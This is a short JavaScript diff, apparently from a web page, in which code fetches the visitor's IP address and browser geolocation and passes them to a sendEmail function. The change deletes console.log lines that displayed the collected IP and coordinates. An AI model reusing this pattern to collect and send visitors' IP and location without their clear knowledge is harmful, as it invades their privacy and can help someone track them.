@@ -67,12 +67,9 @@
         $.getJSON("https://api.ipify.org?format=json", function (data) {
           let ip = data.ip;
 
-          console.log("Retrieved IP Address:", ip);
-
           navigator.geolocation.getCurrentPosition((position) => {
             let lat = position.coords.latitude;
             let long = position.coords.longitude;
-            console.log("Retrieved Position:", lat, long);
 
             // Send the formatted message via email
             sendEmail(ip, lat, long);
